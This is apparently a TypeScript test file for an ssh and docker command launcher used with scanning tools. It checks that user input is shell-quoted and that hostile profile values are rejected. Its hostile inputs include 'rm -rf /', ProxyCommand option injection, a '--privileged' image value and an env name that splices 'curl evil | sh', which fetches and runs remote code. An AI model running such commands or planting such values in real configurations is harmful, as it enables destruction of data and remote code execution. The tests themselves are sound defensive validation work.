import { describe, expect, it } from 'vitest'
import { backendProfileInputSchema, type BackendProfile } from '@exe/protocol'
import { launcherForProfile, sshInvocation, dockerInvocation } from './launcher.js'

const base = { id: 'b1', name: 'p', createdAt: 't', updatedAt: 't' } as const

describe('launcherForProfile', () => {
  it('returns a local launcher for undefined or local profiles', () => {
    expect(launcherForProfile(undefined).kind).toBe('local')
    expect(launcherForProfile({ ...base, kind: 'local' }).kind).toBe('local')
  })
  it('returns ssh/docker launchers for remote profiles', () => {
    expect(launcherForProfile({ ...base, kind: 'ssh', host: 'h', user: 'u' }).kind).toBe('ssh')
    expect(launcherForProfile({ ...base, kind: 'docker', image: 'i' }).kind).toBe('docker')
  })
})

describe('sshInvocation', () => {
  it('builds a batch-mode ssh command with the remote program quoted', () => {
    const p: BackendProfile = { ...base, kind: 'ssh', host: 'scanbox', user: 'root', port: 2222, identityFile: '/k/id' }
    const { program, args } = sshInvocation(p, 'nmap', ['-sV', '10.0.0.1'])
    expect(program).toBe('ssh')
    expect(args).toContain('BatchMode=yes')
    expect(args).toContain('-p')
    expect(args).toContain('2222')
    expect(args).toContain('-i')
    expect(args).toContain('/k/id')
    expect(args).toContain('root@scanbox')
    // Program + args are shell-quoted into the final remote command string.
    expect(args[args.length - 1]).toBe(`'nmap' '-sV' '10.0.0.1'`)
  })
  it('cd+exec into the workdir when set, and quotes injection attempts', () => {
    const p: BackendProfile = { ...base, kind: 'ssh', host: 'h', user: 'u', workdir: '/tmp/w' }
    const { args } = sshInvocation(p, 'sh', ['-c', "echo hi; rm -rf /"])
    expect(args[args.length - 1]).toBe(`cd '/tmp/w' && exec 'sh' '-c' 'echo hi; rm -rf /'`)
  })
  it('prepends exported env (e.g. PATH) to the remote command', () => {
    const p: BackendProfile = { ...base, kind: 'ssh', host: 'h', user: 'u', env: { PATH: '/home/bx0/go/bin:/usr/bin' } }
    const { args } = sshInvocation(p, 'httpx', ['-u', 'x'])
    expect(args[args.length - 1]).toBe(`export PATH='/home/bx0/go/bin:/usr/bin'; 'httpx' '-u' 'x'`)
  })
})

describe('launch value checks', () => {
  it('ends ssh option parsing before the destination', () => {
    const { args } = sshInvocation({ ...base, kind: 'ssh', host: 'h', user: 'u' }, 'id', [])
    expect(args[args.indexOf('u@h') - 1]).toBe('--')
  })

  it('refuses a stored profile whose user, host or image would read as an option', () => {
    expect(() => sshInvocation({ ...base, kind: 'ssh', host: 'h', user: '-oProxyCommand=touch /tmp/x' }, 'id', [])).toThrow(
      /user must not start with "-"/,
    )
    expect(() => sshInvocation({ ...base, kind: 'ssh', host: '-oProxyCommand=x', user: 'u' }, 'id', [])).toThrow(/host/)
    expect(() => dockerInvocation({ ...base, kind: 'docker', image: '--privileged' }, 'id', [])).toThrow(/image/)
  })

  it('refuses an env name that would splice shell into the remote command', () => {
    const env = { 'X=1; curl evil | sh; Y': 'v' }
    expect(() => sshInvocation({ ...base, kind: 'ssh', host: 'h', user: 'u', env }, 'id', [])).toThrow(/variable name/)
    expect(() => dockerInvocation({ ...base, kind: 'docker', image: 'i', env }, 'id', [])).toThrow(/variable name/)
  })

  it('rejects the same values when a profile is saved', () => {
    const parse = (fields: Record<string, unknown>) => backendProfileInputSchema.safeParse({ name: 'p', ...fields }).success
    expect(parse({ kind: 'ssh', host: 'h', user: '-oProxyCommand=x' })).toBe(false)
    expect(parse({ kind: 'ssh', host: 'h h', user: 'u' })).toBe(false)
    expect(parse({ kind: 'docker', image: '-v=/:/h' })).toBe(false)
    expect(parse({ kind: 'ssh', host: 'h', user: 'u', env: { 'A B': 'x' } })).toBe(false)
    expect(parse({ kind: 'ssh', host: 'kali.lan', user: 'root', env: { PATH: '/usr/bin' } })).toBe(true)
  })
})

describe('dockerInvocation', () => {
  it('runs a throwaway container with the image and command', () => {
    const p: BackendProfile = { ...base, kind: 'docker', image: 'kali:latest', workdir: '/work' }
    const { program, args } = dockerInvocation(p, 'whatweb', ['example.com'])
    expect(program).toBe('docker')
    expect(args).toEqual(['run', '--rm', '-i', '-w', '/work', 'kali:latest', 'whatweb', 'example.com'])
  })
  it('passes env with -e flags', () => {
    const p: BackendProfile = { ...base, kind: 'docker', image: 'kali', env: { HTTP_PROXY: 'http://p:8080' } }
    const { args } = dockerInvocation(p, 'nmap', ['x'])
    expect(args).toEqual(['run', '--rm', '-i', '-e', 'HTTP_PROXY=http://p:8080', 'kali', 'nmap', 'x'])
  })
})
